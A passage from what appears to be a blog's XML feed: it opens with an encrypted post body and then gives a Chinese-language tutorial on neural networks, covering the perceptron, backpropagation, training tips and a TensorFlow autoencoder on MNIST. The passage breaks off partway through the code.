43f38c7a49c2e448595cfb0282f42ada8df046b18d69b4db2db3d4ff14c3d7b4c7879201bab73d4b557c8e40027969b1d165be952e16dbf00d8f8603c4792b74755e9a3b4fcbd73d848f7d13520445b09aaf8d5bbdae0fe608a262035d824ec20fd41758f71a3e261b882ac48d567e89f9ba4d717cf399ddd27763bc3465242856d1f935683fcf99cf26beb265d43d4bfd6255893effd082b47bdac3b42e756670ad0aab520b257891610a43128efc5dc7dee4a70b490c4f61627325f471367d9c5da298c183d71c63824ee4665a4cad2e43a37a9efd8b00ba9c32e91f7eff3c80772ad7c8288af03735befa91d04a5c01151fdcda93dc850a6920651d880ef15a2061ca87b29b6b0bbd985bff927493840aec2a4ba472cd9282c54171f2c801b3f11c00d5d1ece01e85d840f19dd0afa62c61c7d3c127a3e2e0dd4326d62f4ddf8df3dded0b0901d489735ac1c083ef23b231b7679496e07bdfdd401e30e0b065cc0a4b2bd98af53c30dc76995a330c459abf2d1a1d1210aa5d3999b7d034e93aadd5b1a94b48a798ed669e3b9285081badc4e5497be8a4e2cf08e0a04b9b35718b59b1ee0b2280291522e7a5d47733303da68f6862559b063f169e2f3f6da3653030147c22b47f4dd413b3abf4cc4728d5c850387346d4d257e7778363dfb0597ee22b14ce7e8d12d7527a80621d95e0ea8a1324495a8f9c7fac180a75af4389ef969dbd5f22ba75d6547ab1b3821653db4a065a6ebc939d67cca956fd9ed256fad79ab5fcd73295a7cec858256d87a63d91de6b7b766c53ed8659005e8ce2d5fda10a2bad97f488857c58855bf2ae0515fb838899e7915bef6c9d7ebc9b1d2a8762e931a6f36c273fab763fa48f3e4369b4b827b8107845d22c63ed6a336df19d0a2eafb4d468409230594436f6a62e3f54cf38cb25895a8a4da0cb19bf28d07da2c68a4325c926ee5ca5831d665ef886cab4828ac7017260850a92a21d98c459c42111a79f4380cda590397334f7f8547c8534359a7ce14516b5739c096077add84a7c3d96ba681f453e03df3f5a6210b8cb10e2f1a51fb5141b64c69db8f3660a86f5c1a935515cc56cf9f1ce6d9e529ba9a4aadae657eecd63797afd9e168040ce76e8b48fbd7658b9b538b112e50d2ee8ee574f0aa9a8a00d797c4ec6763d0cb3efad47e3cf8652f15dd50b55b6557845c5216afbbb10f386cca9e4b3fa5410c480fd8cb8cf49bc67dc732b1b82f6b77bda5e22f17035f55fbbc9b93f91899c7bffff53f74535c3e1aaf3ffa67588cb53fe5036de657586f301a85315c6a8eacf0e8f2136de50d677db1a7f020905852314135900454cefd7abc9e964abfe29066f83e066d742885cc041bf9da9e226cff197ed3c90dccc724b0788507134b86f41c8c88b2ffee58792df375acdc44b8d85be7ac2a88a359ff1a0ff685098c3b6b0630c9f6c8bcf8b76fea9a557b5270c5a08c2623177adf04ae497fb334ab946a2434121efb9d9a2095d1165023e37ccfbd8f89bc4ae5795bc9227dcd07a979a5e44d0e09fd5f446c45c77712dd3f562778be252d325ffa4f73e9607ccd134c1706371f95a4daccaa245282bcd8906ecfe377eb86f794d40069c65bd90433cbfcd1178357ab72834bedad7b7abd893c11d84ba8c992f92d5c8bbc3247697ae63fd62eae8cd98b979df7c99f99a066897c478689dff635bd1b5f7dd43424f71affbf35097e9168bc445de595d865211b8f422a0127f5cdbca8eae7b9ee46de5b3f9c4693a504bb9d8315b02fbc0b429e08d7eba43e6dad22d0281e1abb4d47878562f6520f25c1a226fe85ba75658a3633499c89a6955e121e67beb5c4e4b30ffe1dbcd672da246dd18b77a6012190410c267bc5b93d8e16cef6f31ba7c7933aaf6177d2e07</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>ics</tag>
      
      <tag>rpi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ANN &amp; Deep Learning</title>
    <link href="/2020/07/13/ANN-Deep-Learning/"/>
    <url>/2020/07/13/ANN-Deep-Learning/</url>
    
    <content type="html"><![CDATA[<p>人工神经网络和深度学习入门。</p><a id="more"></a><h1 id="Artificial-Neural-Network"><a href="#Artificial-Neural-Network" class="headerlink" title="Artificial Neural Network"></a>Artificial Neural Network</h1><p>人工神经网络（英语：Artificial Neural Network，ANN），简称神经网络（Neural Network，NN）或类神经网络，在机器学习和认知科学领域，是一种模仿生物神经网络（动物的中枢神经系统，特别是大脑）的结构和功能的数学模型或计算模型，用于对函数进行估计或近似。</p><h2 id="History-of-ANN"><a href="#History-of-ANN" class="headerlink" title="History of ANN"></a>History of ANN</h2><p>1943 年，心理学家 W.S.McCulloch 和数理逻辑学家 W.Pitts 基于神经元的生理特征，建立了单个神经元的数学模型（MP 模型）。</p><p><img src="/pics/ANN-Deep-Learning/1.png" srcset="/img/loading.gif" alt></p><p>对应的数学模型：</p><p>$$<br>y_k=\phi(\sum_{i=1}^m\omega_{ki}x_i+b_k)=\phi(\omega_k^Tx+b)<br>$$</p><h2 id="感知器算法（Perceptron-Algorithm）"><a href="#感知器算法（Perceptron-Algorithm）" class="headerlink" title="感知器算法（Perceptron Algorithm）"></a>感知器算法（Perceptron Algorithm）</h2><p>1957 年，Frank Rosenblatt 从纯数学的角度重新考察这一模型，指出能够从一些输入输出对 $(x,y)$ 中通过学习算法获得权重 $\omega$ 和 $b$。输入 $\{(x_i,y_i)\}_{i=1\sim N}$：</p><ol><li>随机选择 $\omega$ 和 $b$；</li><li>循环：取一个训练样本 $(x,y)$；<ol><li>若 $\omega^T+b&gt;0$ 且 $y=-1$，则：$\omega=\omega-x$、$b=b-1$；</li><li>若 $\omega^T+b&lt;0$ 且 $y=+1$，则：$\omega=\omega+x$、$b=b+1$。</li></ol></li><li>终止条件：直到所有输入输出都不满足 2 中的两个条件之一，退出循环。</li></ol><p>$$<br>\begin{array}{l}<br>\omega_{新}^Tx+b_{新}=(\omega-x)^Tx+(b-1)\\<br>=(\omega^T+b)-(\lVert x\rVert^2+1)\\<br>≤(\omega^T+b)-1<br>\end{array}<br>$$</p><p>证明：</p><ul><li>定义一个增广向量 $\vec{x}$；<ol><li>若 $y=+1$，则 $\vec{x}=\begin{bmatrix}x\\ 1\end{bmatrix}$；</li><li>若 $y=-1$，则 $\vec{x}=\begin{bmatrix}-x\\ -1\end{bmatrix}$。</li></ol></li><li>定义增广 $\omega=\begin{bmatrix}\omega\\ b\end{bmatrix}$。感知器算法定义可简化为输入 $\vec{x_i}$：<ol><li>随机取 $\omega$；</li><li>循环：取一个 $\vec{x_i}$，若 $\omega^T\vec{x_i}&lt;0$，则 $\omega=\omega+\vec{x_i}$；</li><li>终止条件：直到所有输入输出都不满足 2 中的条件，退出循环。</li></ol></li></ul><h3 id="感知器算法的收敛定理"><a href="#感知器算法的收敛定理" class="headerlink" title="感知器算法的收敛定理"></a>感知器算法的收敛定理</h3><p>输入 $\{\vec{x_i}\}_{i=1\sim N}$，若线性可分，即存在 $\omega_{opt}$，使：$\omega_{opt}^T\vec{x_i}&gt;0(i=1\sim N)$，则利用上述感知器算法，经过有限步后，得到一个 $\omega$，使 $\omega^T\vec{x_i}&gt;0(i=1\sim N)$。（$\omega$ 和 $\omega_{opt}$ 存在很小的概率相等）</p><p>证：不失一般性，设 $\lVert\omega_{opt}\rVert=1$（因为 $\omega_{opt}$ 与 $a\omega_{opt}(a&gt;0)$ 是同一平面）。假设第 $k$ 步的 $\omega$ 是 $\omega(k)$，且有一个 $\vec{x_i}$，使 $\omega(k)^T\vec{x_i}&lt;0$，根据感知器算法：</p><p>$$<br>\begin{array}{l}<br>\omega(k+1)=\omega(k)+\vec{x_i}\\<br>\omega(k+1)-a\omega_{opt}=\omega(k)+\vec{x_i}-a\omega_{opt}\\<br>\lVert\omega(k+1)-a\omega_{opt}\rVert^2=\lVert\omega(k)+\vec{x_i}-a\omega_{opt}\rVert^2\\<br>=\lVert\omega(k)-a\omega_{opt}+\vec{x_i}\rVert^2\\<br>=\lVert\omega(k)-a\omega_{opt}\rVert^2+\lVert\vec{x_i}\rVert^2+2\omega(k)^T\vec{x_i}-2a\omega_{opt}^T\vec{x_i}<br>\end{array}<br>$$</p><p>一定可以取到很大的 $a$，使 $\lVert\omega(k+1)-a\omega_{opt}\rVert^2&lt;\lVert\omega(k)-a\omega_{opt}\rVert^2$。</p><p>定义：$\beta=\max_{i\sim N}\{\lVert\vec{x_i}\rVert\}$、$\gamma=\min_{i=1\sim N}(\omega_{opt}^Tx_i)$，取 $a=\frac{\beta^2+1}{2\gamma}$，则 $\lVert\omega(k+1)-a\omega_{opt}\rVert^2&lt;\lVert\omega(k)-a\omega_{opt}\rVert^2-1$。</p><p>取 $D=\lVert\omega(0)-a\omega_{opt}\rVert$，则至多经过 $D^2$ 步，$\omega$ 将会收敛至 $a\omega_{opt}$。</p><p>$$<br>\begin{array}{l}<br>D^2=\lVert\omega(0)-a\omega_{opt}\rVert^2\\<br>=\lVert\omega(0)\rVert^2+a^2\lVert\omega_{opt}\rVert^2-2a\omega(0)^T\omega_{opt}\\<br>=\lVert\omega(0)\rVert^2+a^2\lVert\omega_{opt}\rVert^2-2a\lVert\omega(0)\rVert\lVert\omega_{opt}\rVert\cos\theta\\<br>≤\lVert\omega(0)\rVert^2+a^2+2a\lVert\omega(0)\rVert<br>\end{array}<br>$$</p><h2 id="人工智能的第一次冬天"><a href="#人工智能的第一次冬天" class="headerlink" title="人工智能的第一次冬天"></a>人工智能的第一次冬天</h2><p>Minsky 创造了线性可分（不可分）的概念（1969，《Perceptron》），提出日常生活中很多分类问题都是非线性可分的。</p><p>例：识别一个二值图像是否全连通。</p><h2 id="多层神经网络（Multiple-layer-Neural-Network）"><a href="#多层神经网络（Multiple-layer-Neural-Network）" class="headerlink" title="多层神经网络（Multiple-layer Neural Network）"></a>多层神经网络（Multiple-layer Neural Network）</h2><p>多层神经网络（多层前馈神经网络，Multi-layer Feedforward Neural Network）的出现让解决非线性可分的问题成为可能。</p><h3 id="二层神经网络"><a href="#二层神经网络" class="headerlink" title="二层神经网络"></a>二层神经网络</h3><p>给出输入数据 $x=\begin{bmatrix}x_1\\ x_2\end{bmatrix}$，有二层神经网络如下：</p><p><img src="/pics/ANN-Deep-Learning/2.png" srcset="/img/loading.gif" alt></p><p>其中 $\phi(\cdot)$ 是一个非线性函数。</p><p>$$<br>\begin{cases}<br>a_1=\omega_{11}x_1+\omega_{12}x_2+b_1\\<br>a_2=\omega_{21}x_1+\omega_{22}x_x+b_2\\<br>z_1=\phi(a_1)\\<br>z_2=\phi(a_2)\\<br>y=\omega_1z_1+\omega_2z_2+b<br>\end{cases}<br>$$</p><p>即 $y=\omega_1\phi(\omega_{11}x_1+\omega_{12}x_2+b_1)+\omega_2\phi(\omega_{21}x_1+\omega_{22}x_2+b_2)+b$。若 $\phi(\cdot)$ 不做映射，可以证明与单个神经元模型完全相同：</p><p>$$<br>\begin{array}{l}<br>y=\omega_1(\omega_{11}x_1+\omega_{12}x_2+b_1)+\omega_2(\omega_{21}x_1+\omega_{22}x_2+b_2)+b\\<br>=(\omega_1\omega_{11}+\omega_2\omega_{21})x_1+(\omega_1\omega_{12}+\omega_2\omega_{22})x_2+(\omega_1b_1+\omega_2b_2+b)<br>\end{array}<br>$$</p><p>故必须包含非线性函数 $\phi(\cdot)$，才能构成一个非线性问题。非线性函数 $\phi(x)$ 一般取阶跃函数或 Sigmoid 函数：</p><p><img src="/pics/ANN-Deep-Learning/3.png" srcset="/img/loading.gif" alt></p><p>阶跃函数可以被证明能够处理所有非线性问题。</p><h3 id="三层神经网络"><a href="#三层神经网络" class="headerlink" title="三层神经网络"></a>三层神经网络</h3><p>定理：三层神经网络可以模拟所有决策面。假设有以下非线性问题，灰色部分设为 $C_1$，其他部分设为 $C_2$：</p><p><img src="/pics/ANN-Deep-Learning/4.png" srcset="/img/loading.gif" alt></p><p>根据二层神经网络，构造如下三层神经网络：</p><p><img src="/pics/ANN-Deep-Learning/5.png" srcset="/img/loading.gif" alt></p><h2 id="后向传播算法（Back-Propagation，误差逆传播）"><a href="#后向传播算法（Back-Propagation，误差逆传播）" class="headerlink" title="后向传播算法（Back Propagation，误差逆传播）"></a>后向传播算法（Back Propagation，误差逆传播）</h2><p>针对上面的的二层神经网络，进行梯度下降法求局部极值（Gradient Descent Method）：</p><ol><li>找一个 $\omega_0$；</li><li>设 $k=0$，假设 $\frac{d f(\omega)}{d\omega}\vert_{\omega_k}=0$，退出。否则，$\omega_{k+1}=\omega_k-\alpha\frac{d f(\omega)}{d\omega}\vert_{\omega_k}$，其中 $\alpha&gt;0$ 是学习率。</li></ol><p>$$<br>\begin{array}{l}<br>f(\omega+\Delta\omega)=f(\omega)+\frac{d f(\omega)}{d\omega}\vert_\omega\cdot\Delta\omega+o(\Delta\omega)\\<br>f(\omega_{k+1})=f(\omega_k)+(\frac{d f(\omega)}{d\omega}\vert_{\omega_k})\cdot(-\alpha\frac{d f(\omega)}{d\omega}\vert_{\omega_k})\\<br>=f(\omega_k)-\alpha[\frac{d f(\omega)}{d\omega}\vert_{\omega_k}]^2+o(\Delta\omega)≤f(\omega_k)<br>\end{array}<br>$$</p><p>输入 $\{(x_i,Y_i)\}_{i=1\sim N}$。针对输入 $(X,Y)$，有 $E=\frac{1}{2}(y-Y)^2$（MSE，Mean Score Error）。推导过程：</p><ol><li>随机取变量（$\omega_{11}$、$\omega_{12}$、$\omega_{21}$、$\omega_{22}$、$b_1$、$b_2$、$\omega_1$、$\omega_2$、$b$）；</li><li>对所有的 $\omega$，求 $\frac{\partial E}{\partial\omega}$；对所有的 $b$，求 $\frac{\partial E}{\partial b}$；</li><li>有 $\omega^{(新)}=\omega^{(旧)}-\alpha\frac{\partial E}{\partial\omega}\vert_{\omega^{(旧)}}$，$b^{(新)}=b^{(旧)}-\alpha\frac{\partial E}{\partial b}\vert_{b^{(旧)}}$；</li><li>当所有 $\frac{\partial E}{\partial\omega}$ 与 $\frac{\partial E}{\partial b}$ 都为 0 时，退出。</li></ol><p>根据上面的式子计算所有偏导数的过程：</p><p>$$<br>\begin{array}{l}<br>\frac{dE}{dy}=(y-Y)\\<br>\frac{\partial E}{\partial a_1}=\frac{dE}{dy}\frac{\partial y}{\partial z_1}\frac{dz_1}{da_1}=(y-Y)\omega_1\phi’(a_1)\\<br>\frac{\partial E}{\partial a_2}=\frac{dE}{dy}\frac{\partial y}{\partial z_2}\frac{dz_2}{da_2}=(y-Y)\omega_2\phi’(a_2)\\<br>\frac{\partial E}{\partial b}=\frac{dE}{dy}\frac{\partial y}{\partial b}=(y-Y)\\<br>\frac{\partial E}{\partial\omega_1}=\frac{dE}{dy}\frac{\partial y}{\partial\omega_1}=(y-Y)z_1\\<br>\frac{\partial E}{\partial\omega_2}=\frac{dE}{dy}\frac{\partial y}{\partial\omega_2}=(y-Y)z_2\\<br>\frac{\partial E}{\partial\omega_{11}}=\frac{\partial E}{\partial a_1}\frac{\partial a_1}{\partial\omega_{11}}=(y-Y)\omega_1\phi’(a_1)x_1\\<br>\frac{\partial E}{\partial\omega_{12}}=\frac{\partial E}{\partial a_1}\frac{\partial a_1}{\partial\omega_{12}}=(y-Y)\omega_1\phi’(a_1)x_2\\<br>\frac{\partial E}{\partial b_1}=\frac{\partial E}{\partial a_1}\frac{\partial a_1}{\partial b_1}=(y-Y)\omega_1\phi’(a_1)\\<br>\frac{\partial E}{\partial\omega_{21}}=\frac{\partial E}{\partial a_2}\frac{\partial a_2}{\partial\omega_{21}}=(y-Y)\omega_1\phi’(a_2)x_1\\<br>\frac{\partial E}{\partial\omega_{22}}=\frac{\partial E}{\partial a_2}\frac{\partial a_2}{\partial\omega_{22}}=(y-Y)\omega_1\phi’(a_2)x_2\\<br>\frac{\partial E}{\partial b_2}=\frac{\partial E}{\partial a_2}\frac{\partial a_2}{\partial b_2}=(y-Y)\omega_2\phi’(a_2)<br>\end{array}<br>$$</p><p>$\phi(x)$ 不能取阶跃函数，因为阶跃函数中除了 $x=0$ 时，其他地方 $\phi’(x)=0$，导致不能进行后向传播。BP 神经网络中通常采用如下的函数：</p><ul><li>Sigmoid 函数：$\phi(x)=\frac{1}{1+e^{-x}}$；<ul><li>$\phi’(x)=\phi(x)[1-\phi(x)]$。</li></ul></li><li>双曲正切函数：$\phi(x)=\tanh(x)=\frac{e^x-e^{-x}}{e^x+e^{-x}}$；<ul><li>$\phi’(x)=1-[\phi(x)]^2$。</li></ul></li><li>线性整流函数（Rectified Linear Units）：$\phi(x)=ReLu(x)=\begin{cases}x,x&gt;0\\ 0,x≤0\end{cases}=\max(0,x)$；<ul><li>$\phi’(x)=\begin{cases}1,x&gt;0\\ 0,x≤0\end{cases}$。</li></ul></li><li>带泄漏的线性整流函数（Leak ReLu）：$\phi(x)=\begin{cases}x,x&gt;0\\ \beta x,x≤0\end{cases}$。<ul><li>$\phi’(x)=\begin{cases}1,x&gt;0\\ \beta,x≤0\end{cases}$。</li></ul></li></ul><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>将 BP 算法放在一个更具有普适性的情况下实现。定义：</p><ol><li>网络共 $l$ 层；</li><li>$z^{(k)}$、$a^{(k)}$、$b^{(k)}$ 是第 $k$ 层的向量，与第 $k$ 层神经元个数一致；</li><li>$z_i^{(k)}$、$a_i^{(k)}$、$b_i^{(k)}$ 表示 $z^{(k)}$、$a^{(k)}$、$b^{(k)}$ 的第 $i$ 个分量；</li><li>用 $y_i$ 表示 $y$ 的第 $i$ 个分量。</li></ol><p><img src="/pics/ANN-Deep-Learning/6.jpg" srcset="/img/loading.gif" alt></p><p>求偏导的过程如下。设 $\delta_i^{(m)}=\frac{\partial E}{\partial z_i^{(m)}}$：</p><ol><li>$\delta_i^{(l)}=\frac{\partial E}{\partial z_i^{(l)}}=\frac{\partial E}{\partial y_i}\frac{\partial y_i}{\partial z_i^{(l)}}=(y_i-Y_i)\phi’(z_i^{(l)})$；</li><li>$\delta_i^{(m)}=\frac{\partial E}{\partial z_i^{(m)}}=\frac{\partial E}{\partial a_i^{(m)}}\frac{\partial a_i^{(m)}}{\partial z_i^{(m)}}=\phi(z_i^{(m)})’(\sum_{j=1}^{S_{m+1}}\delta_j^{(m+1)}\omega_{ji})$，其中 $S_m$ 为第 $m$ 层上 $z$ 的个数且 $1≤m≤(l-1)$；</li><li>$\begin{cases}\frac{\partial E}{\partial\omega_{ij}^{(m)}}=\delta_j^{(m)}a_i^{(m-1)}\\ \frac{\partial E}{\partial b_i^{(m)}}=\delta_i^{(m)}\end{cases}$；</li></ol><p>BP 算法流程：</p><ol><li>随机初始化 $(\omega,b)$；</li><li>训练样本 $(X,Y)$ 代入网络，可求出所有的 $(z,a,y)$（前向计算）；</li><li>链式法则求偏导。最小化 $E=\frac{1}{2}\lVert y-Y\rVert^2=\frac{1}{2}\sum_{i=1}^M(y_i-Y_i)^2$，求 $\frac{\partial E}{\partial\omega},\frac{\partial E}{\partial b}$（后向传播）；</li><li>更新参数：$\omega^{(新)}=\omega^{(旧)}-\alpha\frac{\partial E}{\partial\omega}\vert_{\omega^{(旧)}}$，$b^{(新)}=b^{(旧)}-\alpha\frac{\partial E}{\partial b}\vert_{b^{(旧)}}$。</li></ol><h3 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h3><p>参数设置：</p><ol><li>随机梯度下降（Stochastic Gradient Descent，SGD）；<ul><li>不用每输入一个样本就去变换参数，而是输入一批样本（一个 BATCH 或 MINI-BATCH），求出这些样本的梯度平均值后，根据这个平均值改变参数。</li></ul></li><li>激活函数选择；<ul><li>Sigmoid、tanh、ReLU、Leaky ReLU、Maxout、ELU。</li></ul></li><li>训练数据初始化；<ul><li>做均值和方差的归一化：$newX=\frac{X-mean(X)}{std(X)}$。</li></ul></li><li>$(\omega,b)$ 的初始化；<ul><li>梯度消失现象：如果 $\omega^Tx+b$ 一开始很大或很小，那么梯度将趋近于 0，反向传播后前面与之相关的梯度也趋近于 0，导致训练缓慢。因此，要使 $\omega^Tx+b$ 一开始就在 0 附近；</li><li>一种简单有效的方法：$(\omega,b)$ 初始化从区间 $(-\frac{1}{\sqrt{d}},\frac{1}{\sqrt{d}})$ 均匀随机取值。其中 $d$ 为 $(\omega,b)$ 所在层的神经元个数。可以证明，如果 $x$ 服从正态分布，均值 0，方差 1，且各个维度无关，而 $(\omega,b)$ 是 $(-\frac{1}{\sqrt{d}},\frac{1}{\sqrt{d}})$ 的均匀分布，则 $\omega^Tx+b$ 是均值为 0，方差为 $\frac{1}{3}$ 的正态分布。</li></ul></li><li><a href="http://proceedings.mlr.press/v37/ioffe15.pdf" target="_blank" rel="noopener">Batch Normalization</a>；<ul><li>既然希望每一层获得的值都在 0 附近，从而避免梯度消失现象，那么为什么不直接把每一层的值做基于均值和方差的归一化？</li><li>每一层 FC（Fully Connected Layer）接一个 BN（Batch Normalization）；</li><li>$\hat{x}^{(k)}=\frac{x^{(k)}-E[x^{(k)}]}{\sqrt{Var[x^{(k)}]}}$。</li></ul></li><li>目标函数选择；<ul><li>可加正则项（Regulation Term）：$\begin{array}{l}L(\omega)=F(\omega)+R(\omega)\\ =\frac{1}{2}(\sum_{i=1}^{batch_size}\lVert y_i-Y_i\rVert^2+\beta\sum_k\sum_l\omega_{k,l}^2)\end{array}$；</li><li>如果是分类问题，$F(\omega)$ 可以采用 SOFTMAX 函数和交叉熵的组合；<ul><li>SOFTMAX 函数（归一化指数函数）：$q_i=\frac{e^{z_i}}{\sum_{j=1}^Ne^{z_j}}$；</li><li>交叉熵（Cross Entropy）：$E=-\sum_{i=1}^Np_i\log(q_i)$；</li><li>如果 $F(\omega)$ 是 SOFTMAX 函数和交叉熵的组合，那么求导的形式为 $\frac{\partial E}{\partial z_i}=q_i-p_i$。</li></ul></li></ul></li><li>参数更新策略。<ul><li>SGD 的问题；<ol><li>$(\omega,b)$ 的每一个分量获得的梯度绝对值有大有小，一些情况下，将会迫使优化路径变成 Z 字形状；</li><li>SGD 求梯度的策略过于随机，由于上一次和下一次用的是完全不同的 BATCH 数据，将会出现优化的方向随机的情况；</li></ol></li><li>解决各个方向梯度不一致的方法；<ul><li>AdaFrad；</li><li>RMSProp。</li></ul></li><li>解决梯度随机性的问题；<ul><li>Momentum。</li></ul></li><li>同时解决两个问题。<ul><li>Adam。</li></ul></li></ul></li></ol><p>训练建议：</p><ol><li>一般情况下，在训练集上的目标函数的平均值（Cost）会随着训练的深入而不断减小，如果这个指标有增大的情况，停下来。有两种情况：第一是采用的模型不够复杂，以致于不能在训练集上完全拟合；第二是已经训练很好了；</li><li>分出一些验证集（Validation Set），训练的本质是在验证集上获取最大的识别率。因此训练一段时间后，必须在验证集上测试识别率，保存使验证集在识别率最大的模型参数，作为最后结果；</li><li>注意调整学习率（Learning Rate），如果刚训练几步 Cost 就增加，一般来说是学习率太高了；如果每次 Cost 变化很小，说明学习率太低；</li><li>Batch Normalization 比较好用，对学习率、参数更新策略等不敏感。如果采用其他方法，合理变换各种参数组合也可以达到目的；</li><li>由于梯度累积效应，AdaGrad、RMSProp、Adam 三种更新策略到了训练后期会很慢，可以通过提高学习率来补偿。</li></ol><h1 id="Deep-Learning"><a href="#Deep-Learning" class="headerlink" title="Deep Learning"></a>Deep Learning</h1><p>深度学习是机器学习的分支，是一种以人工神经网络为架构，对数据进行表征学习的算法。</p><h2 id="从多层神经网络说起"><a href="#从多层神经网络说起" class="headerlink" title="从多层神经网络说起"></a>从多层神经网络说起</h2><p>多层神经网络的优势：</p><ol><li>基本单元简单，多个基本单元可扩展为非常复杂的非线性函数。因此易于构建，同时模型有很强的表达能力；</li><li>训练和测试的计算并行性非常好，有利于在分布式系统上的应用；</li><li>模型构建来源于对人脑的仿生，话题丰富，各种领域的研究人员都有兴趣，都能做贡献。</li></ol><p>多层神经网络的劣势：</p><ol><li>数学不漂亮，优化算法只能获得局部极值，算法性能与初始值有关；</li><li>不可解释。训练神经网络获得的参数与实际任务的关联性非常模糊；</li><li>模型可调整的参数很多（网络层数、每层神经元的个数、非线性函数、学习率、优化方法、终止条件等等），使得训练神经网络变成了一门“艺术”；</li><li>如果要训练相对复杂的网络，需要大量的训练样本。</li></ol><h2 id="数据库介绍"><a href="#数据库介绍" class="headerlink" title="数据库介绍"></a>数据库介绍</h2><h3 id="Mnist"><a href="#Mnist" class="headerlink" title="Mnist"></a>Mnist</h3><p>手写数字数据库（LeCun 在 1998 年创造）：</p><ol><li>手写数字 0-9 共 10 类；</li><li>训练样本 60000 个，测试样本 10000 个；</li><li>图像大小 28*28 二值图像。</li></ol><h3 id="ImageNet"><a href="#ImageNet" class="headerlink" title="ImageNet"></a>ImageNet</h3><p>Fei-fei Li 等在 2007 年创造：</p><ol><li>1000 类，100 多万张（2009 年的规模）；</li><li>图片大小：正常图片大学，像素几百*几百；</li><li>WORDNET 结构，拥有多个 Node（节点）。一个 Node（目前）含有至少 500 个对应物体的可供训练的图片/图像。</li></ol><h2 id="自编码器（Auto-Encoder）"><a href="#自编码器（Auto-Encoder）" class="headerlink" title="自编码器（Auto Encoder）"></a>自编码器（Auto Encoder）</h2><p>2003 年，人工神经网络进入了沉寂期，因为在样本量少的情况下人工神经网络相对于 SVM 等算法几乎没有优势。自编码器算法为人工神经网络带来了转机和并促进了深度学习的出现。</p><p>自编码器是一种利用 BP 算法使得输入值等于输出值的神经网络，部分解决了 $(\omega,b)$ 参数初始化问题。从本质上来讲，自编码器是一种数据压缩算法，其压缩和解压缩算法都是通过神经网络来实现的。例如训练如下网络：</p><p><img src="/pics/ANN-Deep-Learning/7.png" srcset="/img/loading.gif" alt></p><ul><li>步骤 1：先训练这个网络；</li></ul><p><img src="/pics/ANN-Deep-Learning/8.png" srcset="/img/loading.gif" alt></p><ul><li>步骤 2：定义一个自编码器，使第一层的输入和输出都是 $X$。训练好第 1 层后，接着训练第 2 层（固定第一层参数不动）；</li></ul><p><img src="/pics/ANN-Deep-Learning/9.png" srcset="/img/loading.gif" alt></p><ul><li>步骤 M：以此类推，训练好第 M-1 层后，接着训练第 M 层（固定第 M-1 层参数不动）；</li></ul><p><img src="/pics/ANN-Deep-Learning/10.png" srcset="/img/loading.gif" alt></p><ul><li>最后用 BP 对网络进行微调。</li></ul><p><img src="/pics/ANN-Deep-Learning/11.png" srcset="/img/loading.gif" alt></p><h3 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a>Programming</h3><p>这里用 Python 下的 TensorFlow 库实现自编码器。使用 MNIST 数据集进行训练和测试：</p><pre><code class="python">#!/usr/bin/env python3import tensorflow.compat.v1 as tftf.disable_v2_behavior()import numpy as npimport matplotlib.pyplot as plt# Import MNIST datafrom tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&#39;/tmp/data/&#39;, one_hot=False)# Visualize decoder setting# ParameterslearningRate = 0.01 # 学习率为0.01trainingEpochs = 5 # 训练5组batchSize = 256 # 一组Batch共256个数据examplesToShow = 10 # 展示10个样例# Network ParametersnInput = 784 # MNIST data input (img shape: 28 * 28)# tf Graph input (only pictures)X = tf.placeholder(&#39;float&#39;, [None, nInput])# hidden layer settingsnHidden1 = 256 # 1st layer num featuresnHidden2 = 128 # 2nd layer num featuresweights = { # 权重w    &#39;encoderH1&#39;: tf.Variable(tf.random_normal([nInput, nHidden1])),    &#39;encoderH2&#39;: tf.Variable(tf.random_normal([nHidden1, nHidden2])),    &#39;decoderH1&#39;: tf.Variable(tf.random_normal([nHidden2, nHidden1])),    &#39;decoderH2&#39;: tf.Variable(tf.random_normal([nHidden1, nInput])),}biases = { # 偏置b    &#39;encoderB1&#39;: tf.Variable(tf.random_normal([nHidden1])),    &#39;encoderB2&#39;: tf.Variable(tf.random_normal([nHidden2])),    &#39;decoderB1&#39;: tf.Variable(tf.random_normal([nHidden1])),    &#39;decoderB2&#39;: tf.Variable(tf.random_normal([nInput])),}# Building the encoderdef encoder(x):    # Encoder Hidden layer with sigmoid activation # 1    layer1 = tf.nn.sigmoid(tf.add(tf.matmul(x, weights[&#39;encoderH1&#39;]), biases[&#39;encoderB1&#39;]))    # Decoder Hidden layer with sigmoid activation # 2    layer2 = tf.nn.sigmoid(tf.add(tf.matmul(layer1, weights[&#39;encoderH2&#39;]), biases[&#39;encoderB2&#39;]))    return layer2# Building the decoderdef decoder(x):    # Encoder Hidden layer with sigmoid activation # 1    layer1 = tf.nn.sigmoid(tf.add(tf.matmul(x, weights[&#39;decoderH1&#39;]), biases[&#39;decoderB1&#39;]))    # Decoder Hidden layer with sigmoid activation # 2    layer2 = tf.nn.sigmoid(tf.add(tf.matmul(layer1, weights[&#39;decoderH2&#39;]), biases[&#39;decoderB2&#39;]))    return layer2# Construct modelencoderOp = encoder(X)decoderOp = decoder(encoderOp)# 因为自编码器中输入和输出相同，都设为X# PredictionyPred = decoderOp # 预测的结果# Targets (Labels) are the input data.yTrue = X # 真实的结果# Define loss and optimizer, minimize the squared errorcost = tf.reduce_mean(tf.pow(yTrue - yPred, 2)) # 计算MSEoptimizer = tf.train.AdamOptimizer(learningRate).minimize(cost) # 使用Adam算法优化# Initializing the variablesinit = tf.initialize_all_variables()# Launch the graphwith tf.Session() as sess:    sess.run(init)    totalBatch = int(mnist.train.num_examples / batchSize) # 计算Batch的数量    # Training cycle    for epoch in range(trainingEpochs):        # Loop over all batches        for i in range(totalBatch):            batchXs, batchYs = mnist.train.next_batch(batchSize) # max(x) = 1, min(x) = 0            # Run optimization op (backprop) and cost op (to get loss value)            _, c = sess.run([optimizer, cost], feed_dict={X: batchXs}) # 优化本层参数        # Display logs per epoch step        print(&#39;Epoch: {}, cost = {:.9f}&#39;.format((epoch + 1), c))    print(&#39;Optimization Finished!&#39;)    # Applying encode and decode over test set    decodeImages = sess.run(yPred, feed_dict={X:mnist.test.images[:examplesToShow]}) # 获取解压缩得到的图片    # Compare original images with their reconstructions    f, 